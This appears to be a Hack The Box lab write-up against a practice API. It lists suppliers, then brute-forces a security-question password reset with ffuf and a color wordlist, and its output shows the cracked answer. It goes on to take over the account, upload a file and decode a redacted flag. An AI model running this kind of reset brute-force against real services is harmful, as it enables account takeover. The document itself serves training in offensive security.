Authenticate: 

<img width="814" height="378" alt="image" src="https://github.com/user-attachments/assets/da219db5-b3b2-4fd3-964a-93eaaf9e8f00" />

Check roles: 

<img width="394" height="189" alt="image" src="https://github.com/user-attachments/assets/f3cbe976-2425-4a62-8b2d-25d39e7f6971" />

GET /api/v2/suppliers endpoint:

<img width="863" height="508" alt="image" src="https://github.com/user-attachments/assets/627f353c-43a9-4381-bc82-b278ed6fc8dd" />

Suppliers Security Questions:

```
$ curl -s -X 'GET'   'http://154.57.164.77:30397/api/v2/suppliers'   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlckBoYWNrdGhlYm94LmNvbSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6WyJTdXBwbGllcnNfR2V0IiwiU3VwcGxpZXJzX0dldEFsbCJdLCJleHAiOjE3NzA0MDYzNjksImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.VlZzAMDnERztiLmEE4EYlmu6pGKl8phIfH1lVnQUnVWWFUK2ExIyZUo0RjqqG8D3RbeJWUIn6J9zxOeANWMmeg' | jq '.suppliers[] | select(.securityQuestion != "SupplierDidNotProvideYet")'
{
  "id": "eac0c347-12e0-4435-b902-c7e22e3c9dd5",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Patrick Howard",
  "email": "P.Howard1536@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
}
{
  "id": "b87017cd-c720-43a3-acbe-46bfbfd6e4aa",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Luca Walker",
  "email": "L.Walker1872@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
}
{
  "id": "fafebea0-8894-4744-b7de-6c66d5749740",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Tucker Harris",
  "email": "T.Harris1814@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
}
{
  "id": "36f17195-395f-443e-93a4-8ceee81c6106",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Brandon Rogers",
  "email": "B.Rogers1535@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
}
{
  "id": "73ff2040-8d86-4932-bd3f-6441d648dcca",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Mason Alexander",
  "email": "M.Alexander1650@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
}
```
`What is your favorite color?`

Reset PW in the /api/v2/authentication/suppliers/passwords/resets/security-question-answers endpoint:

```
$ cat << EOF > supplierEmails.txt
P.Howard1536@globalsolutions.com
L.Walker1872@globalsolutions.com
T.Harris1814@globalsolutions.com
B.Rogers1535@globalsolutions.com
M.Alexander1650@globalsolutions.com
EOF
```

```
wget https://gist.githubusercontent.com/mordka/c65affdefccb7264efff77b836b5e717/raw/e65646a07849665b28a7ee641e5846a1a6a4a758/colors-list.txt
```

Bruteforce: 

```
$ ffuf -w colors-list.txt:ANSWER -w supplierEmails.txt:EMAIL -u http://154.57.164.77:30397/api/v2/authentication/suppliers/passwords/resets/security-question-answers -X POST -H "Content-Type: application/json" -H "accept: application/json" -d '{"SupplierEmail": "EMAIL", "SecurityQuestionAnswer": "ANSWER", "NewPassword": "Password123!"}' -fs 23

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://154.57.164.77:30397/api/v2/authentication/suppliers/passwords/resets/security-question-answers
 :: Wordlist         : ANSWER: /home/htb-ac-943240/colors-list.txt
 :: Wordlist         : EMAIL: /home/htb-ac-943240/supplierEmails.txt
 :: Header           : Content-Type: application/json
 :: Header           : Accept: application/json
 :: Data             : {"SupplierEmail": "EMAIL", "SecurityQuestionAnswer": "ANSWER", "NewPassword": "Password123!"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 23
________________________________________________

[Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 89ms]
    * ANSWER: rust
    * EMAIL: B.Rogers1535@globalsolutions.com

:: Progress: [830/830] :: Job [1/1] :: 1000 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Reset PW: 

<img width="1775" height="399" alt="image" src="https://github.com/user-attachments/assets/d4495f90-65ac-4c62-b2d9-42355840b53b" />

Authenticate and Authorize JWT /api/v2/authentication/suppliers/sign-in endpoint: 

<img width="554" height="187" alt="image" src="https://github.com/user-attachments/assets/986256a8-462c-4d6f-abc6-f5bff3180b6c" />
<img width="821" height="380" alt="image" src="https://github.com/user-attachments/assets/0505aa97-0257-48f2-87de-24fcb7658de7" />

POST /api/v2/suppliers/current-user/cv endpoint:

Find a file under 10MB and choose 1: 

```
$find / -name *.pdf 2>/dev/null | xargs ls -lh
find / -name *.pdf 2>/dev/null | xargs ls -lh
-rw-r--r-- 1 root root  21K May  3  2023 /usr/lib/libreoffice/share/xpdfimport/xpdfimport_err.pdf
-rw-r--r-- 1 root root  979 Sep 26  2024 /usr/share/cups/data/classified.pdf
-rw-r--r-- 1 root root  981 Sep 26  2024 /usr/share/cups/data/confidential.pdf
-rw-r--r-- 1 root root  845 Sep 26  2024 /usr/share/cups/data/default.pdf
-rw-r--r-- 1 root root 108K Sep 26  2024 /usr/share/cups/data/default-testpage.pdf
-rw-r--r-- 1 root root 270K Sep 26  2024 /usr/share/cups/data/form_english.pdf
^SNIP^

```

In api -> browse and upload:

<img width="486" height="300" alt="image" src="https://github.com/user-attachments/assets/a0295f8f-24ff-457b-becf-179e22f30e28" />
<img width="591" height="349" alt="image" src="https://github.com/user-attachments/assets/b1e10371-8ed7-416a-99bc-a91d261f2368" />


Base64: 

<img width="669" height="464" alt="image" src="https://github.com/user-attachments/assets/532bddbe-1837-4b64-bfec-8395747ad434" />

Decode: 

HTB{XXXXXXXXXXXXXXXXX}








